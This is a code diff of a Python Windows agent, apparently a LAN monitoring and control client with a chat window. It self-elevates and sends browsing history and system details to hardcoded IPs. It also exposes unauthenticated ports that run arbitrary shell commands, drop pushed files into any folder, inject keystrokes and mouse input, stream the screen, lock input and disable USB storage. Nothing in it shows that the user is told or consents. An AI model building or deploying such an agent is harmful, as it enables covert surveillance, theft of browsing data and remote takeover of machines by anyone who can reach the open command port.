@@ -1,24 +1,29 @@
 import os
+import io
 import sys
 import time
 import json
+import queue
 import socket
-import sqlite3
-import shutil
 import platform
 import subprocess
 import threading
-import io
-import base64
 import ctypes
-import keyboard  
-import mouse  
+import random
+import sqlite3
+import shutil
 import tkinter as tk
-import queue
+from tkinter import scrolledtext
+
+try:
+    import keyboard
+    import mouse
+except ImportError:
+    pass
 
 ui_queue = queue.Queue()
 
-DASHBOARD_IPS = ["192.168.1.4","172.65.21.7", "172.65.21.90", "172.65.21.1","172.65.21.45"]
+DASHBOARD_IPS = ["192.168.1.4", "172.65.21.45", "172.65.21.7", "172.65.21.90", "172.65.21.1", "172.65.21.6"]
 TELEMETRY_PORT = 5005
 LISTEN_COMMAND_PORT = 6006
 STREAM_SERVER_PORT = 7007      
@@ -30,21 +35,39 @@ EDGE_HISTORY_FILE = os.path.join(EDGE_HISTORY_DIR, "History")
 hardware_lock_state = {
     "Keyboard": False,
     "Printer": {},
-    "PnpDevices": {}
+    "PnpDevices": {},
+    "usb_ports_blocked": False  # Track global USB lock state
 }
-
 
 active_chat_room = {
     "peers": [],
     "ui_instance": None,
-    "text_area": None
+    "text_area": None,
+    "roster_listbox_instance": None
 }
 
+peer_colors = {}
 mouse_hook_instance = None
+global_root_engine = None  
 
 def is_admin():
-    try: return ctypes.windll.shell32.IsUserAnAdmin()
-    except: return False
+    try: 
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except: 
+        return False
+
+def get_local_ip():
+    """Helper method to accurately fetch the primary local IP address."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        # Does not need to be reachable to resolve local interface binding
+        s.connect(('10.255.255.255', 1))
+        IP = s.getsockname()[0]
+    except Exception:
+        IP = '127.0.0.1'
+    finally:
+        s.close()
+    return IP
 
 def fetch_system_specs():
     try:
@@ -57,9 +80,7 @@ def fetch_system_specs():
     try:
         mac_cmd = 'getmac /fo csv /nh'
         mac_raw = subprocess.check_output(mac_cmd, shell=True).decode(errors="ignore").splitlines()
-
         mac_address = "N/A"
-
         for line in mac_raw:
             parts = line.replace('"', '').split(',')
             if len(parts) >= 1:
@@ -93,25 +114,22 @@ def gather_pnp_hardware_assets():
                 item_class = item.get("Class", "Peripheral")
                 instance_id = item.get("InstanceId", "")
                 
-                # Dynamic validation logic across state registries
                 if item_class == "Keyboard" and hardware_lock_state["Keyboard"]: 
                     display_status = "BLOCKED"
                 elif item_class in ["PrintQueue", "Printer"] and hardware_lock_state["Printer"].get(name, False): 
                     display_status = "BLOCKED"
                 elif hardware_lock_state["PnpDevices"].get(instance_id, False):
-                    # Direct lookup tracking for standard PnP blocks
                     display_status = "BLOCKED"
                 else:
                     raw_status = item.get("Status", "Unknown")
-                    # Fallback validation verification mapping
                     if raw_status in ["Error", "Degraded", "Disabled"]:
                         display_status = "BLOCKED"
                     else:
                         display_status = "Active"
                 
-                # NOTE: Ensure key fits 'mfg' pattern mapping to match dashboard expectations
                 devices.append({"name": name, "type": item_class, "status": display_status, "raw_id": instance_id})
-    except: pass
+    except: 
+        pass
     return devices
 
 def gather_browsing_history():
@@ -124,11 +142,14 @@ def gather_browsing_history():
         cursor = conn.cursor()
         cursor.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 35")
         for row in cursor.fetchall():
-            try: converted_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime((row[1] / 1000000) - 11644473600))
-            except: converted_time = "Recent Visit"
+            try: 
+                converted_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime((row[1] / 1000000) - 11644473600))
+            except: 
+                converted_time = "Recent Visit"
             logs.append({"site": row[0], "ip": converted_time})
         conn.close()
-    except: pass
+    except: 
+        pass
     if os.path.exists(temp_db):
         try: os.remove(temp_db)
         except: pass
@@ -138,6 +159,7 @@ def package_and_transmit_telemetry():
     payload = fetch_system_specs()
     payload["devices"] = gather_pnp_hardware_assets()
     payload["history"] = gather_browsing_history()
+    payload["usb_status"] = "BLOCKED" if hardware_lock_state["usb_ports_blocked"] else "ACTIVE"
     data_bytes = json.dumps(payload).encode('utf-8')
     data_len = len(data_bytes)
     for host_ip in DASHBOARD_IPS:
@@ -147,32 +169,35 @@ def package_and_transmit_telemetry():
                 s.connect((host_ip, TELEMETRY_PORT))
                 s.sendall(data_len.to_bytes(4, byteorder='big'))
                 s.sendall(data_bytes)
-        except: pass
-
-def cyclic_heartbeat_loop():
-    while True:
-        # Spawn the telemetry package in a separate thread so the 6-second 
-        # sleep interval is strictly enforced without waiting for local execution.
-        threading.Thread(target=package_and_transmit_telemetry, daemon=True).start()
-        time.sleep(6)
+        except: 
+            pass
 
 def enforce_system_lock():
     global mouse_hook_instance
-    keyboard.hook(lambda e: False, suppress=True)
-    if mouse_hook_instance is None: mouse_hook_instance = mouse.hook(lambda e: False)
+    try:
+        keyboard.hook(lambda e: False, suppress=True)
+        if mouse_hook_instance is None: mouse_hook_instance = mouse.hook(lambda e: False)
+    except:
+        pass
 
 def release_system_lock():
     global mouse_hook_instance
     try: keyboard.unhook_all()
     except: pass
     if mouse_hook_instance is not None:
-        try: mouse.unhook(mouse_hook_instance)
-        except: pass
+        try: 
+            mouse.unhook(mouse_hook_instance)
+        except: 
+            pass
         mouse_hook_instance = None
 
 def process_administrative_enforcement(client_socket):
-    import pyautogui
-    pyautogui.FAILSAFE = False
+    try:
+        import pyautogui
+        pyautogui.FAILSAFE = False
+    except:
+        return
+
     try:
         len_bytes = b""
         while len(len_bytes) < 4:
@@ -191,6 +216,12 @@ def process_administrative_enforcement(client_socket):
         action = directive.get("action")
         screen_width, screen_height = pyautogui.size()
 
+        # --- UPDATED: ON-DEMAND POLL STATUS INTERCEPTOR ---
+        if action == "poll_status":
+            package_and_transmit_telemetry()
+            return
+        # --------------------------------------------------
+
         if action == "mouse_move":
             target_x = int(directive.get("x", 0) * screen_width)
             target_y = int(directive.get("y", 0) * screen_height)
@@ -206,12 +237,23 @@ def process_administrative_enforcement(client_socket):
             else: pyautogui.mouseUp(button=btn)
             return
         elif action == "key_input":
-            raw_key = directive.get("key", "")
-            if not raw_key: return
-            key_map = {"Return": "enter", "BackSpace": "backspace", "Tab": "tab", "Escape": "escape", "Delete": "delete", "space": "space", "Up": "up", "Down": "down", "Left": "left", "Right": "right"}
-            resolved_key = key_map.get(raw_key, raw_key.lower())
-            try: pyautogui.press(resolved_key)
-            except: pass
+            mode = directive.get("mode", "direct")
+            input_type = directive.get("type", "")
+            value = directive.get("value", "")
+            
+            if not value:
+                return
+                
+            try:
+                if input_type == "text":
+                    # Directly type out characters without worrying about Shift/Caps tracking down-states
+                    pyautogui.write(value)
+                elif input_type == "functional":
+                    # Direct action validation map loop
+                    if value in pyautogui.KEYBOARD_KEYS:
+                        pyautogui.press(value)
+            except Exception as e:
+                print(f"[Bulletproof Input Engine Error]: {e}")
             return
         elif action == "lock_input":
             hardware_lock_state["Keyboard"] = True
@@ -227,14 +269,78 @@ def process_administrative_enforcement(client_socket):
             cmd_string = directive.get("command")
             subprocess.Popen(cmd_string, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             return
+        elif action == "drop_file":
+            filename = directive.get("file_name", "downloaded_file.bin")
+            target_size = directive.get("file_size", 0)
+            
+            # Extract the custom directory sent by the dashboard
+            raw_target_dir = directive.get("target_directory", r"%USERPROFILE%\Desktop")
+            target_dir = os.path.expandvars(raw_target_dir)
+            
+            try:
+                os.makedirs(target_dir, exist_ok=True)
+            except Exception as dir_err:
+                print(f"Failed to create target directory structure: {dir_err}")
+                target_dir = os.path.expandvars(r"%USERPROFILE%\Desktop")
+                os.makedirs(target_dir, exist_ok=True)
 
+            destination_filepath = os.path.join(target_dir, filename)
+            
+            bytes_harvested = 0
+            try:
+                # Open a binary write stream and pull bytes sequentially straight off the wire
+                with open(destination_filepath, "wb") as out_file:
+                    while bytes_harvested < target_size:
+                        bytes_left = target_size - bytes_harvested
+                        socket_block = client_socket.recv(min(bytes_left, 65536))
+                        if not socket_block:
+                            break
+                        out_file.write(socket_block)
+                        bytes_harvested += len(socket_block)
+                
+                # Trigger native system notifications to let operator confirm successful transmission
+                notif_title = "FILE DEPLOYMENT SUCCESS"
+                notif_msg = f"Asset cleanly landed at destination:\n{destination_filepath}"
+                
+                def spawn_custom_toast(title, message):
+                    toast_win = tk.Toplevel()  
+                    toast_win.title(title)
+                    toast_win.attributes("-topmost", True)
+                    toast_win.configure(bg="#FFFFFF")
+                    toast_win.overrideredirect(True)
+                    
+                    sw, sh = toast_win.winfo_screenwidth(), toast_win.winfo_screenheight()
+                    win_w, win_h = 360, 140
+                    toast_win.geometry(f"{win_w}x{win_h}+{sw - win_w - 20}+{sh - win_h - 60}")
+                    
+                    border_frame = tk.Frame(toast_win, bg="#10B981", bd=1) # Highlight frame green on upload success
+                    border_frame.pack(fill=tk.BOTH, expand=True)
+                    
+                    inner_container = tk.Frame(border_frame, bg="#FFFFFF")
+                    inner_container.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
+                    
+                    btn_close = tk.Button(inner_container, text="×", font=("Segoe UI", 14, "bold"), fg="#666666", bg="#FFFFFF", bd=0, command=toast_win.destroy)
+                    btn_close.place(x=325, y=5, width=25, height=25)
+                    
+                    tk.Label(inner_container, text=title, font=("Segoe UI", 11, "bold"), fg="#10B981", bg="#FFFFFF", anchor="w").pack(fill=tk.X, padx=15, pady=(12, 5))
+                    tk.Label(inner_container, text=message, font=("Segoe UI", 10), fg="#1A1A1A", bg="#FFFFFF", anchor="nw", justify=tk.LEFT, wraplength=320).pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 10))
+
+                    # --- FIXED: AUTOMATIC DISMISSAL TRACKING ---
+                    # Schedules the window to automatically close after 4000ms (4 seconds)
+                    toast_win.after(4000, toast_win.destroy)
+
+                if global_root_engine:
+                    global_root_engine.after(0, lambda: spawn_custom_toast(notif_title, notif_msg))
+            except Exception as io_err:
+                print(f"Agent transfer pipeline error: {io_err}")
+            return
+        
         elif action == "send_notification":
             notif_title = directive.get("title", "SYSTEM NOTICE")
             notif_msg = directive.get("message", "")
             
             def spawn_custom_toast(title, message):
-                import tkinter as tk
-                toast_win = tk.Tk()
+                toast_win = tk.Toplevel()  
                 toast_win.title(title)
                 toast_win.attributes("-topmost", True)
                 toast_win.configure(bg="#FFFFFF")
@@ -253,55 +359,40 @@ def process_administrative_enforcement(client_socket):
                 inner_container = tk.Frame(border_frame, bg="#FFFFFF")
                 inner_container.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
                 
-                btn_close = tk.Button(
-                    inner_container, 
-                    text="×", 
-                    font=("Segoe UI", 14, "bold"), 
-                    fg="#666666", 
-                    bg="#FFFFFF", 
-                    activebackground="#F3F3F3",
-                    activeforeground="#000000",
-                    bd=0, 
-                    cursor="hand2",
-                    command=toast_win.destroy
-                )
+                btn_close = tk.Button(inner_container, text="×", font=("Segoe UI", 14, "bold"), fg="#666666", bg="#FFFFFF", activebackground="#F3F3F3", bd=0, cursor="hand2", command=toast_win.destroy)
                 btn_close.place(x=325, y=5, width=25, height=25)
                 
-                lbl_title = tk.Label(
-                    inner_container, 
-                    text=title.upper(), 
-                    font=("Segoe UI", 11, "bold"), 
-                    fg="#000000", 
-                    bg="#FFFFFF",
-                    anchor="w"
-                )
+                lbl_title = tk.Label(inner_container, text=title.upper(), font=("Segoe UI", 11, "bold"), fg="#000000", bg="#FFFFFF", anchor="w")
                 lbl_title.pack(fill=tk.X, padx=(15, 40), pady=(12, 5))
                 
-                lbl_msg = tk.Label(
-                    inner_container, 
-                    text=message, 
-                    font=("Segoe UI", 10), 
-                    fg="#1A1A1A", 
-                    bg="#FFFFFF",
-                    anchor="nw", 
-                    justify=tk.LEFT,
-                    wraplength=320
-                )
+                lbl_msg = tk.Label(inner_container, text=message, font=("Segoe UI", 10), fg="#1A1A1A", bg="#FFFFFF", anchor="nw", justify=tk.LEFT, wraplength=320)
                 lbl_msg.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 10))
-                
-                toast_win.mainloop()
 
-            threading.Thread(target=spawn_custom_toast, args=(notif_title, notif_msg), daemon=True).start()
+            if global_root_engine:
+                global_root_engine.after(0, lambda: spawn_custom_toast(notif_title, notif_msg))
             return
-
         elif action == "setup_chat_room":
             room_peers = directive.get("peers", [])
             active_chat_room["peers"] = room_peers
-            
-            # CRITICAL FIX: Offload invocation straight to the primary thread queue pipeline
             ui_queue.put("LAUNCH_CHAT")
             return
-        
+        elif action == "setup_chat_room":
+            room_peers = directive.get("peers", [])
+            active_chat_room["peers"] = room_peers
+            ui_queue.put("LAUNCH_CHAT")
+            return    
+        elif action in ["block_all_usb", "unblock_all_usb"]:
+            if action == "block_all_usb":
+                hardware_lock_state["usb_ports_blocked"] = True
+                ps_script = r"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\USBSTOR' -Name Start -Value 4"
+            else:
+                hardware_lock_state["usb_ports_blocked"] = False
+                ps_script = r"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\USBSTOR' -Name Start -Value 3"
+                
+            subprocess.run(f'powershell -ExecutionPolicy Bypass -NoProfile -Command "{ps_script}"', shell=True, capture_output=True)
+            package_and_transmit_telemetry()
+            return
+
         target_id = directive.get("raw_id")
         device_type = directive.get("device_type", "")
         device_name = directive.get("device_name", "")
@@ -329,7 +420,8 @@ def process_administrative_enforcement(client_socket):
             subprocess.run(full_command, shell=True, capture_output=True)
             package_and_transmit_telemetry()
             
-    except Exception as e: pass
+    except: 
+        pass
     finally:
         try: client_socket.close()
         except: pass
@@ -348,8 +440,11 @@ def command_listener_interface():
         except: pass
 
 def screen_stream_listener_interface():
-    import pyautogui
-    pyautogui.FAILSAFE = False
+    try:
+        import pyautogui
+        pyautogui.FAILSAFE = False
+    except:
+        return
     stream_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     stream_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
@@ -376,11 +471,34 @@ def screen_stream_listener_interface():
             threading.Thread(target=serve_screen_stream_worker, args=(conn,), daemon=True).start()
         except: pass
 
-# ==========================================
-# PASTE THESE ABOVE THE __main__ STATEMENT:
-# ==========================================
+def handle_ui_msg_insertion(sender_ip, msg_body, peer_ip_address):
+    """Handles incoming text display and updates tracking using clean IP identifiers."""
+    # Ensure sender matches the connection origin IP safely
+    if peer_ip_address not in active_chat_room["peers"]:
+        active_chat_room["peers"].append(peer_ip_address)
+        refresh_roster_display()
+        
+    # FIX 1: Fetch color based on IP to ensure perfect synchronization across elements
+    assigned_color = get_or_assign_peer_color(peer_ip_address)
+    if peer_ip_address not in peer_colors:
+        peer_colors[peer_ip_address] = assigned_color
+        refresh_roster_display()
+        
+    if active_chat_room["ui_instance"] and active_chat_room["text_area"]:
+        ta = active_chat_room["text_area"]
+        safe_tag_id = f"tag_{peer_ip_address.replace('.', '_')}"
+        try:
+            ta.tag_configure(safe_tag_id, justify="left", foreground=assigned_color)
+            ta.config(state="normal")
+            # FIX 2: Print the peer IP layout instead of hostname
+            ta.insert(tk.END, f"[{peer_ip_address}]: ", safe_tag_id)
+            ta.insert(tk.END, f"{msg_body}\n", "peer_msg")
+            ta.config(state="disabled")
+            ta.see(tk.END)
+        except:
+            pass
+
 def peer_chat_receiver_interface():
-    """Listens continuously on port 8008 for inbound raw messages and displays them left-aligned."""
     chat_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     chat_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     try:
@@ -391,36 +509,112 @@ def peer_chat_receiver_interface():
     while True:
         try:
             sock, _ = chat_socket.accept()
-            data = sock.recv(4096).decode('utf-8')
-            if data:
-                payload = json.loads(data)
-                sender = payload.get("sender", "Unknown Friend")
-                msg_body = payload.get("message", "")
-                
-                if active_chat_room["ui_instance"] and active_chat_room["text_area"]:
-                    active_chat_room["text_area"].config(state="normal")
-                    # DISPLAY PEER MESSAGES ON THE LEFT SIDE USING THE TAG
-                    active_chat_room["text_area"].insert(tk.END, f"[{sender}]: {msg_body}\n", "peer_msg")
-                    active_chat_room["text_area"].config(state="disabled")
-                    active_chat_room["text_area"].see(tk.END)
-            sock.close()
+            try:
+                peer_ip_address = sock.getpeername()[0]
+                data = sock.recv(4096).decode('utf-8')
+                if data:
+                    payload = json.loads(data)
+                    msg_type = payload.get("type", "message")
+                    
+                    if msg_type == "ping":
+                        status_reply = "active" if active_chat_room["ui_instance"] is not None else "inactive"
+                        sock.sendall(json.dumps({"status": status_reply}).encode('utf-8'))
+                        sock.close()
+                        continue
+                    
+                    # Core modification: Route identification completely by sender_ip
+                    sender_ip = payload.get("sender_ip", peer_ip_address)
+                    msg_body = payload.get("message", "")
+                    
+                    ui_window = active_chat_room["ui_instance"]
+                    if ui_window is not None:
+                        ui_window.after(0, lambda s=sender_ip, b=msg_body, ip=peer_ip_address: handle_ui_msg_insertion(s, b, ip))
+            except:
+                pass
+            finally:
+                try: sock.close()
+                except: pass
         except: pass
 
-def spawn_secure_chat_ui():
-    """Generates a responsive windowed UI layout running directly on the primary thread execution context with split message alignment."""
-    import tkinter as tk
-    from tkinter import scrolledtext
+def get_or_assign_peer_color(peer_id):
+    """Retrieves or assigns unique vibrant hex tracking strings keyed explicitly to the IP string."""
+    if peer_id in peer_colors:
+        return peer_colors[peer_id]
+    vibrant_pool = ["#FF5555", "#50FA7B", "#F1FA8C", "#BD93F9", "#FF79C6", "#8BE9FD", "#FFB86C", "#00FFFF", "#FF00FF", "#38BDF8"]
+    assigned_color = random.choice(vibrant_pool)
+    peer_colors[peer_id] = assigned_color
+    return assigned_color
 
+def refresh_roster_display():
+    lb = active_chat_room["roster_listbox_instance"]
+    if not lb or not active_chat_room["ui_instance"]:
+        return
+    try:
+        lb.delete(0, tk.END)
+        
+        # FIX 2: Show Local Host IP instead of User Name
+        my_local_ip = get_local_ip()
+        my_color = get_or_assign_peer_color(my_local_ip)
+        lb.insert(tk.END, f"● {my_local_ip} (You)")
+        lb.itemconfig(0, fg=my_color)
+        
+        idx = 1
+        for peer in active_chat_room["peers"]:
+            if peer not in ["127.0.0.1", "localhost", my_local_ip]:
+                # FIX 2: Populate listbox indices using peer IPs directly
+                lb.insert(tk.END, f"○ {peer}")
+                peer_color = get_or_assign_peer_color(peer)
+                lb.itemconfig(idx, fg=peer_color)
+                idx += 1
+    except:
+        pass
+
+def dynamic_roster_monitor_loop():
+    while True:
+        if active_chat_room["ui_instance"] and active_chat_room["peers"]:
+            verified_peers = []
+            my_local_ip = get_local_ip()
+            
+            snapshot_peers = list(active_chat_room["peers"])
+            for peer_ip in snapshot_peers:
+                if peer_ip in ["127.0.0.1", "localhost", my_local_ip]:
+                    continue
+                is_alive = False
+                try:
+                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                        s.settimeout(1.5)
+                        s.connect((peer_ip, CHAT_STREAM_PORT))
+                        s.sendall(json.dumps({"type": "ping"}).encode('utf-8'))
+                        response_bytes = s.recv(1024).decode('utf-8')
+                        if response_bytes:
+                            resp_data = json.loads(response_bytes)
+                            if resp_data.get("status") == "active":
+                                is_alive = True
+                except: pass
+                
+                if is_alive:
+                    verified_peers.append(peer_ip)
+            
+            ui_window = active_chat_room["ui_instance"]
+            if ui_window is not None:
+                try:
+                    ui_window.after(0, lambda fresh=verified_peers: safe_roster_sync(fresh))
+                except: pass
+        time.sleep(3)
+
+def safe_roster_sync(fresh_list):
+    if active_chat_room["ui_instance"] is not None:
+        active_chat_room["peers"] = fresh_list
+        refresh_roster_display()
+
+def spawn_secure_chat_ui():
     if active_chat_room["ui_instance"] is not None:
         return
 
-    root_chat = tk.Tk()
+    root_chat = tk.Toplevel(global_root_engine)
     root_chat.title("SECURE LAN CHAT ROUTE")
-    
-    # Increased starting layout dimensions to keep elements readable initially
-    root_chat.geometry("450x550")
-    # Enforces absolute structural limits so users cannot resize the window smaller than standard visibility thresholds
-    root_chat.minsize(400, 450)
+    root_chat.geometry("650x550")
+    root_chat.minsize(550, 450)
     root_chat.configure(bg="#1A1B26")  
     root_chat.attributes("-topmost", True)
     
@@ -441,83 +635,80 @@ def spawn_secure_chat_ui():
                 except: pass
 
         threading.Thread(target=alert_dashboard_exit, daemon=True).start()
-        active_chat_room["peers"] = []
+        
         active_chat_room["ui_instance"] = None
         active_chat_room["text_area"] = None
+        active_chat_room["roster_listbox_instance"] = None
+        active_chat_room["peers"] = []
         root_chat.destroy()
 
     root_chat.protocol("WM_DELETE_WINDOW", on_close_cleanup)
 
-    lbl_title = tk.Label(
-        root_chat, 
-        text="// ACTIVE PEER LINK MATRIX", 
-        font=("Consolas", 11, "bold"), 
-        fg="#10B981", 
-        bg="#1A1B26",
-        anchor="w"
-    )
+    lbl_title = tk.Label(root_chat, text="// ACTIVE PEER LINK MATRIX", font=("Consolas", 11, "bold"), fg="#10B981", bg="#1A1B26", anchor="w")
     lbl_title.pack(fill=tk.X, padx=15, pady=(15, 5))
 
-    # --- RESPONSIVE LAYOUT FRAME ---
-    # Setting expand=True handles variable vertical scaling smoothly
-    stream_frame = tk.Frame(root_chat, bg="#1A1B26")
-    stream_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=5)
+    workspace_frame = tk.Frame(root_chat, bg="#1A1B26")
+    workspace_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=5)
 
-    txt_display = scrolledtext.ScrolledText(
-        stream_frame, 
-        wrap=tk.WORD, 
-        state="disabled", 
-        font=("Segoe UI", 10), 
-        bg="#11121A", 
-        fg="#E0E0E6", 
-        bd=0,
-        highlightthickness=1,
-        highlightbackground="#2A2B36",
-        highlightcolor="#10B981"
-    )
-    # Fills all allocated dynamic space inside the stream_frame container
+    roster_frame = tk.Frame(workspace_frame, bg="#1A1B26")
+    roster_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))
+
+    lbl_roster = tk.Label(roster_frame, text="PARTICIPANTS", font=("Segoe UI", 9, "bold"), fg="#A9B1D6", bg="#1A1B26", anchor="w")
+    lbl_roster.pack(fill=tk.X, pady=(0, 5))
+
+    lst_participants = tk.Listbox(roster_frame, width=22, font=("Segoe UI", 10), bg="#11121A", fg="#9ECE6A", bd=0, highlightthickness=1, highlightbackground="#2A2B36", selectbackground="#1A1B26")
+    lst_participants.pack(fill=tk.Y, expand=True)
+
+    active_chat_room["roster_listbox_instance"] = lst_participants
+    refresh_roster_display()
+    
+    if not hasattr(spawn_secure_chat_ui, "monitor_started"):
+        threading.Thread(target=dynamic_roster_monitor_loop, daemon=True).start()
+        spawn_secure_chat_ui.monitor_started = True
+
+    stream_frame = tk.Frame(workspace_frame, bg="#1A1B26")
+    stream_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
+
+    txt_display = scrolledtext.ScrolledText(stream_frame, wrap=tk.WORD, state="disabled", font=("Segoe UI", 10), bg="#11121A", fg="#E0E0E6", bd=0, highlightthickness=1, highlightbackground="#2A2B36", highlightcolor="#10B981")
     txt_display.pack(fill=tk.BOTH, expand=True)
     active_chat_room["text_area"] = txt_display
 
-    txt_display.tag_configure("self_msg",justify="right",foreground="#10B981")
+    txt_display.tag_configure("self_msg", justify="right", foreground="#10B981")
+    txt_display.tag_configure("peer_msg", justify="left", foreground="#E0E0E6")
 
-    txt_display.tag_configure("peer_msg",justify="left",foreground="#E0E0E6")
-
-    # --- RESPONSIVE CONTROL PANEL FRAME ---
-    # This keeps the control dock anchored firmly to the baseline without compressing
     input_frame = tk.Frame(root_chat, bg="#1A1B26")
     input_frame.pack(fill=tk.X, side=tk.BOTTOM, padx=15, pady=15)
 
-    # Entry space expands horizontally automatically to fill variable workspace widths
-    ent_message = tk.Entry(
-        input_frame, 
-        font=("Segoe UI", 11), 
-        bg="#11121A", 
-        fg="#FFFFFF", 
-        insertbackground="#FFFFFF", 
-        bd=0,
-        highlightthickness=1,
-        highlightbackground="#2A2B36",
-        highlightcolor="#10B981"
-    )
+    ent_message = tk.Entry(input_frame, font=("Segoe UI", 11), bg="#11121A", fg="#FFFFFF", insertbackground="#FFFFFF", bd=0, highlightthickness=1, highlightbackground="#2A2B36", highlightcolor="#10B981")
     ent_message.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=8)
 
     def transmit_group_message():
         raw_txt = ent_message.get().strip()
         if not raw_txt: return
         
-        my_hostname = socket.gethostname()
-        msg_packet = json.dumps({"sender": my_hostname, "message": raw_txt})
+        # FIX 2: Generate identities explicitly from the local interface IP address
+        my_local_ip = get_local_ip()
+        msg_packet = json.dumps({"type": "message", "sender_ip": my_local_ip, "message": raw_txt})
         
+        # FIX 1: Fetch color based on local IP to match the roster display exactly
+        my_color = get_or_assign_peer_color(my_local_ip)
+        custom_self_tag = f"tag_{my_local_ip.replace('.', '_')}"
+        
+        txt_display.tag_configure(custom_self_tag, justify="right", foreground=my_color)
         txt_display.config(state="normal")
-        txt_display.insert(tk.END, f"[{my_hostname}]: {raw_txt}\n","self_msg")
+        # FIX 2: Print out local IP tag header inside the display field text pane
+        txt_display.insert(tk.END, f"[{my_local_ip}]: ", custom_self_tag)
+        txt_display.insert(tk.END, f"{raw_txt}\n", "self_msg")
         txt_display.config(state="disabled")
         txt_display.see(tk.END)
         
         ent_message.delete(0, tk.END)
 
         def worker():
-            for peer_ip in active_chat_room["peers"]:
+            local_ip = get_local_ip()
+            for peer_ip in list(active_chat_room["peers"]):
+                if peer_ip in ["127.0.0.1", "localhost", local_ip]:
+                    continue
                 try:
                     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                         s.settimeout(2.0)
@@ -527,19 +718,7 @@ def spawn_secure_chat_ui():
 
         threading.Thread(target=worker, daemon=True).start()
 
-    # Fixed button width with explicit internal padding ensures visibility regardless of text box context
-    btn_send = tk.Button(
-        input_frame, 
-        text="SEND MESSAGE", 
-        font=("Segoe UI", 9, "bold"), 
-        fg="#FFFFFF", 
-        bg="#10B981", 
-        activebackground="#059669", 
-        activeforeground="#FFFFFF",
-        bd=0, 
-        width=15, 
-        cursor="hand2"
-    )
+    btn_send = tk.Button(input_frame, text="SEND MESSAGE", font=("Segoe UI", 9, "bold"), fg="#FFFFFF", bg="#10B981", activebackground="#059669", activeforeground="#FFFFFF", bd=0, width=15, cursor="hand2")
     btn_send.pack(side=tk.RIGHT, padx=(10, 0), ipady=7)
     btn_send.config(command=transmit_group_message)
     
@@ -549,28 +728,33 @@ def spawn_secure_chat_ui():
     root_chat.lift()
     root_chat.focus_force()
 
-    root_chat.mainloop()
-
+def run_application_event_poll():
+    try:
+        while True:
+            task = ui_queue.get_nowait()
+            if task == "LAUNCH_CHAT":
+                spawn_secure_chat_ui()
+    except queue.Empty:
+        pass
+    
+    if global_root_engine:
+        global_root_engine.after(200, run_application_event_poll)
 
 if __name__ == "__main__":
     if not is_admin():
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        try:
+            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        except:
+            pass
         sys.exit()
     
     package_and_transmit_telemetry()
-    threading.Thread(target=cyclic_heartbeat_loop, daemon=True).start()
     threading.Thread(target=command_listener_interface, daemon=True).start()
     threading.Thread(target=screen_stream_listener_interface, daemon=True).start()
     threading.Thread(target=peer_chat_receiver_interface, daemon=True).start()
     
-    # --- SYNCHRONIZED MAIN THREAD TASK CONTROLLER ---
-    while True:
-        try:
-            # Check for queued UI creation requests every 1 second
-            task = ui_queue.get(timeout=1.0)
-            if task == "LAUNCH_CHAT":
-                spawn_secure_chat_ui()
-        except queue.Empty:
-            pass
-        except KeyboardInterrupt:
-            sys.exit()
+    global_root_engine = tk.Tk()
+    global_root_engine.withdraw()  
+    
+    global_root_engine.after(200, run_application_event_poll)
+    global_root_engine.mainloop()
